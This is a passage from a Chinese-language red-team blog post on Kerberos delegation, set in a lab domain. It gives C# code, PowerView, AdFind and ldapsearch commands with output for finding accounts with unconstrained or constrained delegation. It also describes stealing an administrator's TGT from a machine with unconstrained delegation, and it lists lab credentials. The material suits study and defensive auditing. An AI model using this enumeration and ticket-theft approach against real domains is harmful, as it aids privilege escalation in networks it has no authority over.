<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="å§å§æˆ‘ä»¬ä¸çº¦">
<meta property="og:type" content="website">
<meta property="og:title" content="æˆ‘æ˜¯GGè¿˜æ˜¯MM">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="æˆ‘æ˜¯GGè¿˜æ˜¯MM">
<meta property="og:description" content="å§å§æˆ‘ä»¬ä¸çº¦">
<meta property="og:locale">
<meta property="article:author" content="1">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'åšä¸»'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://example.com/"/>





  <title>æˆ‘æ˜¯GGè¿˜æ˜¯MM</title>
  








<meta name="generator" content="Hexo 5.4.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">æˆ‘æ˜¯GGè¿˜æ˜¯MM</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            é¦–é¡µ
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            å½’æ¡£
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/03/kerberos%E5%A7%94%E6%B4%BE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/47177122?v=4">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="æˆ‘æ˜¯GGè¿˜æ˜¯MM">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/10/03/kerberos%E5%A7%94%E6%B4%BE/" itemprop="url">kerberoså§”æ´¾</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2021-10-03T21:33:37+08:00">
                2021-10-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="0x00-c-æ£€æµ‹å§”æ´¾è´¦æˆ·"><a href="#0x00-c-æ£€æµ‹å§”æ´¾è´¦æˆ·" class="headerlink" title="0x00 c#æ£€æµ‹å§”æ´¾è´¦æˆ·"></a>0x00 c#æ£€æµ‹å§”æ´¾è´¦æˆ·</h1><p>å‰æ–‡å·²ç»å†™åˆ°æ£€æµ‹åŸŸå†…dcsyncï¼Œadminsdholderç­‰åé—¨å’Œä¸€äº›åŸºæœ¬åŸŸå†…ä¿¡æ¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">public static void Checkdelegation()</span><br><span class="line">        &#123;</span><br><span class="line">            Ldapcoon.LDAP_COON();</span><br><span class="line">            Font.InfoFonts();</span><br><span class="line">            Console.WriteLine(&quot;\r\n&quot;);</span><br><span class="line">            Console.WriteLine(&quot;===========éçº¦æŸæ€§å§”æ´¾ä¸»æœº===========&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">            Ldapcoon.search.Filter = &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;;</span><br><span class="line">            foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string computers = &quot;&quot;;</span><br><span class="line">                string groupdescription = &quot;&quot;;</span><br><span class="line">                computers = r.Properties[&quot;distinguishedName&quot;][0].ToString();</span><br><span class="line">                Console.WriteLine(computers);</span><br><span class="line">                //groupdescription = r.Properties[&quot;description&quot;][0].ToString();</span><br><span class="line">                //Console.WriteLine(&quot;Description: &quot; + groupdescription + &quot;\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Font.InfoFonts();</span><br><span class="line">            Console.WriteLine(&quot;\r\n&quot;);</span><br><span class="line">            Console.WriteLine(&quot;===========éçº¦æŸæ€§å§”æ´¾ç”¨æˆ·===========&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">            Ldapcoon.search.Filter = &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;;</span><br><span class="line">            foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string users = &quot;&quot;;</span><br><span class="line">                string groupdescription = &quot;&quot;;</span><br><span class="line">                users = r.Properties[&quot;distinguishedName&quot;][0].ToString();</span><br><span class="line">                Console.WriteLine(users);</span><br><span class="line">                //groupdescription = r.Properties[&quot;description&quot;][0].ToString();</span><br><span class="line">                //Console.WriteLine(&quot;Description: &quot; + groupdescription + &quot;\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Font.InfoFonts();</span><br><span class="line">            Console.WriteLine(&quot;\r\n&quot;);</span><br><span class="line">            Console.WriteLine(&quot;===========çº¦æŸæ€§å§”æ´¾ç”¨æˆ·=============&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">            Ldapcoon.search.Filter = &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;;</span><br><span class="line">            foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string users = &quot;&quot;;</span><br><span class="line">                string target = &quot;&quot;;</span><br><span class="line">                int user_count = 0;</span><br><span class="line">                int target_count = 0;</span><br><span class="line">                int len = 0;</span><br><span class="line"></span><br><span class="line">                user_count = r.Properties[&quot;distinguishedName&quot;].Count;</span><br><span class="line">                target_count = r.Properties[&quot;msDS-AllowedToDelegateTo&quot;].Count;</span><br><span class="line"></span><br><span class="line">                while (len &lt; user_count)</span><br><span class="line">                &#123;</span><br><span class="line">                    users = r.Properties[&quot;distinguishedName&quot;][len].ToString();</span><br><span class="line">                    Console.WriteLine(users);</span><br><span class="line">                    len++;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                len = 0;</span><br><span class="line">                Font.Warning();</span><br><span class="line">                Console.WriteLine(&quot;\r\ntarget SPN&quot;);</span><br><span class="line">                Font.NormailFonts();</span><br><span class="line">                while (len &lt; target_count)</span><br><span class="line">                &#123;</span><br><span class="line">                    target = r.Properties[&quot;msDS-AllowedToDelegateTo&quot;][len].ToString();</span><br><span class="line">                    Console.WriteLine(target);</span><br><span class="line">                    len++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Font.InfoFonts();</span><br><span class="line">            Console.WriteLine(&quot;\r\n&quot;);</span><br><span class="line">            Console.WriteLine(&quot;===========çº¦æŸæ€§å§”æ´¾ä¸»æœº=============&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">            Ldapcoon.search.Filter = &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;;</span><br><span class="line">            foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string users = &quot;&quot;;</span><br><span class="line">                string target = &quot;&quot;;</span><br><span class="line">                int user_count = 0;</span><br><span class="line">                int target_count = 0;</span><br><span class="line">                int len = 0;</span><br><span class="line"></span><br><span class="line">                user_count = r.Properties[&quot;distinguishedName&quot;].Count;</span><br><span class="line">                target_count = r.Properties[&quot;msDS-AllowedToDelegateTo&quot;].Count;</span><br><span class="line"></span><br><span class="line">                while(len &lt; user_count)</span><br><span class="line">                &#123;</span><br><span class="line">                    users = r.Properties[&quot;distinguishedName&quot;][len].ToString();</span><br><span class="line">                    Console.WriteLine(users);</span><br><span class="line">                    len++;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                len = 0;</span><br><span class="line">                Font.Warning();</span><br><span class="line">                Console.WriteLine(&quot;\r\ntarget SPN&quot;);</span><br><span class="line">                Font.NormailFonts();</span><br><span class="line">                while (len &lt; target_count)</span><br><span class="line">                &#123;</span><br><span class="line">                    target = r.Properties[&quot;msDS-AllowedToDelegateTo&quot;][len].ToString();</span><br><span class="line">                    Console.WriteLine(target);</span><br><span class="line">                    len++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºçº¦æŸæ€§å§”æ´¾ä¼šæŒ‡å®šå§”æ´¾çš„å¯¹è±¡å¯èƒ½ä¸ºå¤šä¸ªæ‰€ä»¥æˆ‘ä»¬å…ˆæ£€æµ‹ä»–çš„countç„¶åå†éå†è¾“å‡ºã€‚</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXi1Mw.png" alt="wXi1Mw.png"></p>
<h1 id="0x01å§”æ´¾"><a href="#0x01å§”æ´¾" class="headerlink" title="0x01å§”æ´¾"></a>0x01å§”æ´¾</h1><p>å§”æ´¾ï¼šå½“ç”¨æˆ·AåŸºäºkerberoséªŒè¯å»è¯·æ±‚BæœåŠ¡ï¼ŒBæœåŠ¡ä½¿ç”¨Açš„èº«ä»½å»è¯·æ±‚æœåŠ¡Cã€‚</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/7d6d7f0ccec809a7.png"></p>
<ul>
<li>åŸŸå†…ç”¨æˆ·jackä»¥Kerberosæ–¹å¼è®¤è¯åè®¿é—®WebæœåŠ¡å™¨ï¼›</li>
<li>WebæœåŠ¡ä»¥websvcæœåŠ¡è´¦å·è¿è¡Œï¼Œwebsvcå‘KDCå‘èµ·jackç”¨æˆ·çš„ç¥¨æ®ç”³è¯·ï¼›</li>
<li>KDCæ£€æŸ¥websvcç”¨æˆ·çš„å§”æ´¾å±æ€§ï¼Œå¦‚æœè¢«è®¾ç½®ï¼Œåˆ™è¿”å›jackç”¨æˆ·çš„å¯è½¬å‘ç¥¨æ®TGTï¼›</li>
<li>websvcæ”¶åˆ°jackç”¨æˆ·TGTåï¼Œä½¿ç”¨è¯¥ç¥¨æ®å‘KDCç”³è¯·è®¿é—®æ–‡ä»¶æœåŠ¡å™¨çš„æœåŠ¡ç¥¨æ®TGSï¼›</li>
<li>KDCæ£€æŸ¥websvcçš„å§”æ´¾å±æ€§ï¼Œå¦‚æœè¢«è®¾ç½®ï¼Œä¸”ç”³è¯·çš„æ–‡ä»¶æœåŠ¡åœ¨å…è®¸çš„åˆ—è¡¨æ¸…å•ä¸­ï¼Œåˆ™è¿”å›ä¸€ä¸ªjackç”¨æˆ·è®¿é—®æ–‡ä»¶æœåŠ¡çš„æˆæƒç¥¨æ®TGSï¼›</li>
<li>websvcæ”¶åˆ°çš„jackç”¨æˆ·çš„æˆæƒç¥¨æ®TGSåï¼Œå¯è®¿é—®æ–‡ä»¶æœåŠ¡ï¼Œå®Œæˆå¤šè·³è®¤è¯ã€‚</li>
</ul>
<p>åœ¨åŸŸå†…åªæœ‰<strong>æœåŠ¡è´¦å·</strong>å’Œ<strong>æœºå™¨è´¦å·</strong>æ‰å…·æœ‰å§”æ´¾å±æ€§ã€‚</p>
<p><strong>æœºå™¨è´¦å·</strong>å°±æ˜¯ADæ´»åŠ¨ç›®å½•ä¸­ Computers ä¸­çš„è®¡ç®—æœº(ä¸€ä¸ªæ™®é€šåŸŸç”¨æˆ·é»˜è®¤æœ€å¤šå¯ä»¥åˆ›å»ºåä¸ªä¸»æœºè´¦å·)ã€‚</p>
<p><strong>æœåŠ¡è´¦å·</strong>ï¼ˆService Accountï¼‰æ˜¯åŸŸå†…ç”¨æˆ·çš„ä¸€ç§ç±»å‹ï¼Œæ˜¯æœåŠ¡å™¨è¿è¡ŒæœåŠ¡æ—¶æ‰€ç”¨çš„è´¦å·ï¼Œå°†æœåŠ¡è¿è¡Œèµ·æ¥å¹¶åŠ å…¥åŸŸã€‚ä¾‹å¦‚SQL Server åœ¨å®‰è£…æ—¶ï¼Œä¼šåœ¨åŸŸå†…è‡ªåŠ¨æ³¨å†ŒæœåŠ¡è´¦å· SQLServiceAccountã€‚ä¹Ÿå¯ä»¥å°†åŸŸç”¨æˆ·é€šè¿‡æ³¨å†ŒSPNå˜ä¸ºæœåŠ¡è´¦å·ã€‚</p>
<p>å½“ç”¨æˆ·è¢«è®¾ç½®ä¸ºä¸å…è®¸è¢«å§”æ´¾ï¼Œé‚£ä¹ˆå°±ä¸èƒ½å§”æ´¾ã€‚</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXId46.png" alt="wXId46.png"></p>
<p>å§”æ´¾å¯ä»¥åˆ†ä¸ºï¼š</p>
<p><strong>éçº¦æŸæ€§å§”æ´¾</strong></p>
<p><strong>çº¦æŸæ€§å§”æ´¾</strong></p>
<p><strong>åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾</strong></p>
<h2 id="0x02-éçº¦æŸå§”æ´¾"><a href="#0x02-éçº¦æŸå§”æ´¾" class="headerlink" title="0x02 éçº¦æŸå§”æ´¾"></a>0x02 éçº¦æŸå§”æ´¾</h2><p>æ“ä½œç¯å¢ƒï¼š</p>
<blockquote>
<p>åŸŸï¼šredteam.local</p>
<p>åŸŸæ§ï¼šDC.redteam.localã€‚ä¸»æœºåï¼šDCã€‚ipï¼š192.168.11.16</p>
<p>åŸŸç®¡è´¦æˆ·ï¼šAdministrator/test123..</p>
<p>åŸŸå†…æœºå™¨ï¼šMSSQL.redteamã€‚ipï¼š192.168.11.8ã€‚æ™®é€šè´¦æˆ·ï¼šhack/test123..</p>
</blockquote>
<p><strong>å‰æï¼š</strong>åœ¨æœºå™¨è´¦å·Bä¸Šé…ç½®äº†éçº¦æŸæ€§å§”æ´¾(åŸŸç®¡ç†å‘˜æ‰æœ‰æƒé™é…ç½®)</p>
<p>1.ç”¨æˆ·è®¿é—®æœºå™¨Bçš„æŸä¸ªæœåŠ¡ï¼Œäºæ˜¯å‘KDCè®¤è¯ã€‚KDCä¼šæ£€æŸ¥æœºå™¨Bçš„æœºå™¨è´¦å·çš„å±æ€§ï¼Œå‘ç°æ˜¯éçº¦æŸæ€§å§”æ´¾ï¼ŒKDCä¼šå°†ç”¨æˆ·çš„TGTæ”¾åœ¨STæœåŠ¡ç¥¨æ®ä¸­ã€‚</p>
<p>2.ç”¨æˆ·è®¿é—®æœºå™¨Bæ—¶ï¼ŒTGTç¥¨æ®ä¼šå’ŒSTæœåŠ¡ç¥¨æ®ä¸€åŒå‘é€ç»™æœºå™¨B</p>
<p>3.è¿™æ ·Båœ¨éªŒè¯STæœåŠ¡ç¥¨æ®çš„åŒæ—¶è·å–äº†ç”¨æˆ·çš„TGTï¼Œå¹¶å°†TGTå­˜å‚¨åœ¨LSASSè¿›ç¨‹ä¸­ï¼Œä»è€Œå¯ä»¥æ¨¡æ‹Ÿç”¨æˆ·è®¿é—®ä»»æ„æœåŠ¡</p>
<p>ä»ç½‘ç»œæ”»å‡»çš„è§’åº¦æ¥çœ‹ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶äº†æœºå™¨Bçš„æœºå™¨è´¦å·ï¼Œå¹¶ä¸”æœºå™¨Bé…ç½®äº†éçº¦æŸæ€§å§”æ´¾ã€‚åˆ™æ”»å‡»è€…å¯ä»¥è¯±éª—ç®¡ç†å‘˜æ¥è®¿é—®æœºå™¨Bï¼Œç„¶åæ”»å‡»è€…å¯ä»¥è·å–ç®¡ç†å‘˜çš„TGTï¼Œä»è€Œæ¨¡æ‹Ÿç®¡ç†å‘˜è®¿é—®ä»»æ„æœåŠ¡ï¼Œå³è·å¾—äº†ç®¡ç†å‘˜æƒé™ã€‚</p>
<p>åœ¨éçº¦æŸè¡Œå§”æ´¾ä¸­ï¼ŒæœåŠ¡è´¦å·å¯ä»¥è·å–è¢«å§”æ´¾ç”¨æˆ·çš„TGTï¼Œç„¶åæŠŠTGTå­˜å‚¨åœ¨LSASSè¿›ç¨‹ä¸­ï¼Œä»è€ŒæœåŠ¡è´¦å·å¯ä»¥ä½¿ç”¨è¿™ä¸ªTGTå»æ¨¡æ‹Ÿç”¨æˆ·è®¿é—®ä»»ä½•æœåŠ¡ã€‚</p>
<p>å½“æœåŠ¡è´¦å·æˆ–è€…ä¸»æœºè¢«è®¾ç½®ä¸ºéçº¦æŸæ€§å§”æ´¾æ—¶ï¼Œå…¶<code>userAccountControl</code>å±æ€§ä¼šåŒ…å«<code>WORKSTATION_TRUSTED_FOR_DELEGATION</code>ã€‚æˆ‘ä»¬è®¾ç½®MSSQLè¿™ä¸ªæœºå™¨ã€‚</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXiyKM.png" alt="wXiyKM.png"></p>
<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6jr7.png" alt="wX6jr7.png"></p>
<p>å½“æˆ‘ä»¬æ§åˆ¶äº†æœºå™¨è´¦å·MSSQLï¼Œç„¶åè¯±å¯¼ç®¡ç†å‘˜æ¥è®¿é—®æœºå™¨ï¼Œå°±å¯ä»¥è·å¾—ç®¡ç†å‘˜çš„TGTï¼Œä»è€Œè®¿é—®ä»»ä½•æœåŠ¡ã€‚</p>
<h3 id="2-1-ç­›é€‰éçº¦æŸæ€§å§”æ´¾çš„è´¦å·"><a href="#2-1-ç­›é€‰éçº¦æŸæ€§å§”æ´¾çš„è´¦å·" class="headerlink" title="2.1 ç­›é€‰éçº¦æŸæ€§å§”æ´¾çš„è´¦å·"></a>2.1 ç­›é€‰éçº¦æŸæ€§å§”æ´¾çš„è´¦å·</h3><p>åŸŸæ§ä¸»æœºè´¦æˆ·æ˜¯é»˜è®¤å¼€å¯éçº¦æŸæ€§å§”æ´¾</p>
<h4 id="2-1-1-powerview-ps1"><a href="#2-1-1-powerview-ps1" class="headerlink" title="2.1.1 powerview.ps1"></a>2.1.1 powerview.ps1</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"> </span><br><span class="line">æŸ¥è¯¢åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„è´¦æˆ·</span><br><span class="line"><span class="built_in">Get-NetUser</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> redteam.local</span><br><span class="line">æŸ¥è¯¢åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„ä¸»æœºï¼š</span><br><span class="line"><span class="built_in">Get-NetComputer</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> redteam.local</span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator\Desktop&gt; <span class="built_in">Get-NetComputer</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> redteam.local</span><br><span class="line">DC.redteam.local</span><br><span class="line">mssql.redteam.local</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure>



<h4 id="2-1-2-ADFind"><a href="#2-1-2-ADFind" class="headerlink" title="2.1.2 ADFind"></a>2.1.2 ADFind</h4><p>æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„ç”¨æˆ·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=local&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>

<p>æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„ä¸»æœºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=local&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;AdFind.exe -b &quot;DC=redteam,DC=local&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br><span class="line"></span><br><span class="line">AdFind V01.56.00cpp Joe Richards (support@joeware.net) April 2021</span><br><span class="line"></span><br><span class="line">Using server: DC.redteam.local:389</span><br><span class="line">Directory: Windows Server 2016</span><br><span class="line"></span><br><span class="line">dn:CN=DC,OU=Domain Controllers,DC=redteam,DC=local</span><br><span class="line">&gt;cn: DC</span><br><span class="line">&gt;distinguishedName: CN=DC,OU=Domain Controllers,DC=redteam,DC=local</span><br><span class="line"></span><br><span class="line">dn:CN=MSSQL,CN=Computers,DC=redteam,DC=local</span><br><span class="line">&gt;cn: MSSQL</span><br><span class="line">&gt;distinguishedName: CN=MSSQL,CN=Computers,DC=redteam,DC=local</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2 Objects returned</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure>



<h4 id="2-1-3-ldapsearch"><a href="#2-1-3-ldapsearch" class="headerlink" title="2.1.3 ldapsearch"></a>2.1.3 ldapsearch</h4><p>æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„ç”¨æˆ·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>

<p>æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„ä¸»æœºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br><span class="line">distinguishedName: CN=DC,OU=Domain Controllers,DC=redteam,DC=local</span><br><span class="line">distinguishedName: CN=MSSQL,CN=Computers,DC=redteam,DC=local</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€#</span><br></pre></td></tr></table></figure>



